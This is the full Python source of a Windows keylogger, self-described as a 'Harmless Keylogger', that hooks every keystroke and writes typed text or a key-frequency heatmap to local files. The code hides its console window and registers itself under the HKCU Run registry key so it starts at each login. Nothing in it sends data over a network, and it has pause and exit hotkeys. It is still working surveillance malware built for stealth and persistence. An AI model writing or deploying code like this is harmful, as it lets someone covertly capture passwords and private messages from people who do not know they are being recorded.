import keyboard
from keyboard import is_pressed
import win32api
import win32event
import win32console
import win32gui
import winerror
import json
import os
from os.path import exists, join
import sys
from datetime import timedelta, date
from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue

# Folder where the pages of your book get logged
BOOK_PATH = 'myBook'
# Config File
CONFIG_FILE = 'keylogger-config.json'
# Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
LOGGER_NAME = "Harmless Keylogger"
# File path
CURRENT_FILE_PATH = os.path.realpath(sys.argv[0])
# Directory path
DIR_PATH = os.path.dirname(os.path.realpath(sys.argv[0]))

# Config Dict
config = {}
# Buffer for text
line_buffer = ''
# Buffer for Heatmap
heatmap_buffer = {}
heatmap_order = []
# Paused logging
paused = False

# Read confgi from json file
def read_config():
    config_path = join(DIR_PATH, CONFIG_FILE)
    if exists(config_path) and not os.stat(config_path).st_size == 0:
        with open(config_path, "r") as read_file:
            global config
            config = json.load(read_file)
            return True
    else:
        return False

# Read the configurarion
read_config()

# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + ('' if not config["output"] == 'debug' else '_debug'))
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    if not config["hide"] or (config["output"] == 'debug'):
        print("Multiple instances are not allowed")
    exit(0)

# Add to startup for persistence
def add_to_startup():
    global config
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)

    reg_value_prefix = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' '
    reg_value_postfix = '"'

    reg_value = reg_value_prefix + '"' + CURRENT_FILE_PATH + reg_value_postfix

    try:
        SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
    except Exception as e:
        if config["output"] == 'debug':
            print(e)

# Remove from startup f
def remove_from_startup():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)

    try:
        DeleteValue(key2change, LOGGER_NAME)  
    except Exception as e:
        if config["output"] == 'debug':
            print(e, ". Not critical if logger isn't applied to startup")

# Debug logger
def log_debug():
    global config, line_buffer, heatmap_buffer
    if config["mode"] == "heatmap":
        for k, v in heatmap_buffer.items():
            print(v)
        return True
    elif config["mode"] == "text":
        line_buffer = line_buffer.encode()
        print(line_buffer)
        line_buffer = ''
        return True
    return False

# Append file with pressed keys
def log_local():
    global config, line_buffer, heatmap_buffer
    path = join(DIR_PATH, BOOK_PATH)
    if not exists(path):
            os.makedirs(path)  
    if config["mode"] == "heatmap":        
        unused = []
        for k,v in heatmap_buffer.items():
            if v["mentions"] == 0:
                unused.append(k)
        for k in unused:
            del heatmap_buffer[k]
        file = join(path, "heatmap.json")
        with open(file, "w") as write_file:
            json.dump(heatmap_buffer, write_file, indent=4)
        return True
    elif config["mode"] == "text":
        if len(line_buffer) >= config["buffer-size"]:
            file = join(path, ("" if config["page-prefix"] == "" else config["page-prefix"] + "_")  + "page_" + (date.today() - timedelta(days=1)).strftime('%Y-%m-%d') + ".txt")
            f = open(file, "a", encoding='utf8')
            f.write(line_buffer)
            f.close
            line_buffer = ''
            return True
    return False

# Log with configured output
def log_it():
    global config
    if config["output"] == "local":        
        log_local()
    elif config["output"] == "debug":
        log_debug()
    return True

def page_mode(event):
    global line_buffer
    is_pressed_ctrl = is_pressed('ctrl') or is_pressed('right ctrl')
    is_pressed_alt = is_pressed('alt') or is_pressed('alt gr')

    key_pressed = ''
    # Key Represention
    if event.name == 'space':
        key_pressed = ' '
    elif event.name == 'enter':
        key_pressed = '\n'
    elif event.name == 'backspace':
        if config["exclude-typos"]:
            line_buffer = line_buffer[:-1]
    elif not (is_pressed_ctrl | is_pressed_alt):
        if len(event.name) == 1:
            key_pressed = event.name
    else:
        return False

    line_buffer += key_pressed
    
    return log_it()

def heatmap_mode(event):
    global heatmap_buffer, heatmap_order

    key_pressed = {}
    # Key Represention
    if event.name == 'space':
        key_pressed = {
            "name": event.name,
            "scancode": event.scan_code,
            "value": " "
        }
    elif event.name == 'enter':
        key_pressed = {
            "name": event.name,
            "scancode": event.scan_code,
            "value": "\n"
        }
    elif event.name == 'backspace':
        if len(heatmap_order) > 0:
            heatmap_buffer[heatmap_order[-1]]["mentions"] = heatmap_buffer[heatmap_order[-1]]["mentions"] - 1
            heatmap_order.pop()
    else:
        if len(event.name) == 1:
            key_pressed = {
            "name": event.name,
            "scancode": event.scan_code,
            "value": event.name
        }
    
    if not key_pressed == {}:
        index = key_pressed["name"]
        if index in heatmap_buffer and "mentions" in heatmap_buffer[index]:
            heatmap_buffer[index]["mentions"] = heatmap_buffer[index]["mentions"] + 1
        else:
            key_pressed["mentions"] = 1
            heatmap_buffer[index] = key_pressed
        heatmap_order.append(index)
            
    
    return log_it()
    
def key_callback(event):
    global line_buffer, paused

    # while paused no logging
    if paused:
        return False
    
    # event key up 
    if event.event_type == 'up':
        return False
    
    # Console output
    if config["output"] == 'console':
        line_buffer += event.name + " " + str(event.scan_code)
        return log_debug()
    
    if config["mode"] == "heatmap":
         return heatmap_mode(event)
    elif config["mode"] == "text":
        return page_mode(event)
    return False

def pause_logging():
    global paused, line_buffer
    if not config["hide"] or (config["output"] == 'debug'):
        print(LOGGER_NAME + (" paused" if not paused else " continue"))
    paused = not paused

def read_heatmap():
    if config["mode"] == "heatmap":
        path = join(DIR_PATH, BOOK_PATH)
        file = join(path, "heatmap.json")
        if exists(file) and not os.stat(file).st_size == 0:
            with open(file, "r") as read_file:
                global heatmap_buffer
                heatmap_buffer = json.load(read_file)

def hide():
    if not config["output"] == 'debug':
        # Hide Console
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True
    else:
        print("Console Hide")

def main():
    if not config["hide"] or (config["output"] == 'debug'):
        print(LOGGER_NAME + " started")
    keyboard.hook(key_callback)
    # To Pause the Keylogger (ctrl + alt + p)
    keyboard.add_hotkey(config["hotkeys"]["pause-hotkey"], pause_logging)
    # To save the buffer (ctrl + alt + s)
    keyboard.add_hotkey(config["hotkeys"]["save-hotkey"], log_local)
    # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
    keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
    global line_buffer
    log_local()
    if not config["hide"] or (config["output"] == 'debug'):
        print(LOGGER_NAME + " stopped.")
    exit()

if __name__ == '__main__':
    # Hide comand prompt
    if config["hide"]:
        hide()

    # Add to startup
    if config["auto-start"]:
        add_to_startup()
    else: 
        remove_from_startup()

    # Read already saved values 
    read_heatmap()

    main()
